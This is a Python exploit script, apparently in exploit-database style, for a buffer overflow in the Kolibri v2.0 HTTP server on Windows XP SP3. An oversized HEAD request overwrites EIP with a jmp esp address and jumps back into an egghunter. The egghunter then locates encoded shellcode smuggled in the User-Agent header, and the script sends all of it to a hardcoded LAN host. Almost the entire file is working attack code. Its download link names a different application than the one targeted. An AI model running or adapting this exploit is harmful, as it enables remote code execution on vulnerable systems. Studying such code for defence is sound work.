#!/usr/bin/python
#-----------------------------------------------------------------------------------------
# Exploit - Kolibri v2.0 HTTPO server HEAD with egghunter
# OS - WINXP PRO SP3
# Software - http://cdn01.exploit-db.com/wp-content/themes/exploit/applications/ 
#           f248239d09b37400e8269cb1347c240e-BladeAPIMonitor-3.6.9.2.Setup.exe
#-----------------------------------------------------------------------------------------
import socket
import sys
import os

#-----------------------------------------------------------------------------------------


shellcode = (
"\xdb\xc2\xd9\x74\x24\xf4\x5a\x29\xc9\xbe\xb5\xe0\x32\xb0\xb1"
"\x52\x83\xc2\x04\x31\x72\x13\x03\xc7\xf3\xd0\x45\xdb\x1c\x96"
"\xa6\x23\xdd\xf7\x2f\xc6\xec\x37\x4b\x83\x5f\x88\x1f\xc1\x53"
"\x63\x4d\xf1\xe0\x01\x5a\xf6\x41\xaf\xbc\x39\x51\x9c\xfd\x58"
"\xd1\xdf\xd1\xba\xe8\x2f\x24\xbb\x2d\x4d\xc5\xe9\xe6\x19\x78"
"\x1d\x82\x54\x41\x96\xd8\x79\xc1\x4b\xa8\x78\xe0\xda\xa2\x22"
"\x22\xdd\x67\x5f\x6b\xc5\x64\x5a\x25\x7e\x5e\x10\xb4\x56\xae"
"\xd9\x1b\x97\x1e\x28\x65\xd0\x99\xd3\x10\x28\xda\x6e\x23\xef"
"\xa0\xb4\xa6\xeb\x03\x3e\x10\xd7\xb2\x93\xc7\x9c\xb9\x58\x83"
"\xfa\xdd\x5f\x40\x71\xd9\xd4\x67\x55\x6b\xae\x43\x71\x37\x74"
"\xed\x20\x9d\xdb\x12\x32\x7e\x83\xb6\x39\x93\xd0\xca\x60\xfc"
"\x15\xe7\x9a\xfc\x31\x70\xe9\xce\x9e\x2a\x65\x63\x56\xf5\x72"
"\x84\x4d\x41\xec\x7b\x6e\xb2\x25\xb8\x3a\xe2\x5d\x69\x43\x69"
"\x9d\x96\x96\x3e\xcd\x38\x49\xff\xbd\xf8\x39\x97\xd7\xf6\x66"
"\x87\xd8\xdc\x0e\x22\x23\xb7\xf0\x1b\x24\xce\x99\x59\x3a\xc1"
"\x05\xd7\xdc\x8b\xa5\xb1\x77\x24\x5f\x98\x03\xd5\xa0\x36\x6e"
"\xd5\x2b\xb5\x8f\x98\xdb\xb0\x83\x4d\x2c\x8f\xf9\xd8\x33\x25"
"\x95\x87\xa6\xa2\x65\xc1\xda\x7c\x32\x86\x2d\x75\xd6\x3a\x17"
"\x2f\xc4\xc6\xc1\x08\x4c\x1d\x32\x96\x4d\xd0\x0e\xbc\x5d\x2c"
"\x8e\xf8\x09\xe0\xd9\x56\xe7\x46\xb0\x18\x51\x11\x6f\xf3\x35"
"\xe4\x43\xc4\x43\xe9\x89\xb2\xab\x58\x64\x83\xd4\x55\xe0\x03"
"\xad\x8b\x90\xec\x64\x08\xa0\xa6\x24\x39\x29\x6f\xbd\x7b\x34"
"\x90\x68\xbf\x41\x13\x98\x40\xb6\x0b\xe9\x45\xf2\x8b\x02\x34"
"\x6b\x7e\x24\xeb\x8c\xab"
)


# egg hunter prep, jumping backwards 60 bytes, opcode for short jump is \xEB followed by bytes in hex, -60 in hex is \xC4\

esp = '\xcb\x01\xf4\x76'

# Egghunter
# Size 32-bytes
hunter = (
"\x66\x81\xca\xff\x0f\x42\x52"
"\x6a\x02\x58\xcd\x2e\x3c\x05"
"\x5a\x74\xef\xb8\x62\x33\x33" #b33f
"\x66\x8b\xfa\xaf\x75\xea\xaf"
"\x75\xe7\xff\xe7")

#-----------------------------------------------------------------------------------------
# BADCHARS = \x00\x0d\x0a\x3d\x20\x3f
#-----------------------------------------------------------------------------------------
# EIP: 76f401cb : jmp esp |  {PAGE_EXECUTE_READ} [DNSAPI.dll]
# ESP: \xEB\xC4" jump -60 bytes or 60 bytes backwards. 
#   ESP offset is also 515 bytes
# Stage1: Overwrite EIP with jmp esp inscruction, ESP contains eb43 opcode to jump back 60 bytes into our egghunter b33fb33f
# Stage2: Contains shellcode pre-epended with egghunter
#-----------------------------------------------------------------------------------------

Stage1 = "\x41" * 478 + hunter + "\x41" * 5 + esp + "\xEB\xC4" + "\x43" * 73
Stage2 ='b33fb33f' + shellcode

buffer = (
"HEAD /" + Stage1 + " HTTP/1.1\r\n"
"Host: 192.168.15.142:8080\r\n"
"User-Agent: " + Stage2 + "\r\n"
"Keep-Alive: 115\r\n"
"Connection: keep-alive\r\n\r\n")

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("192.168.15.142", 8080))
sock.send(buffer)
sock.close()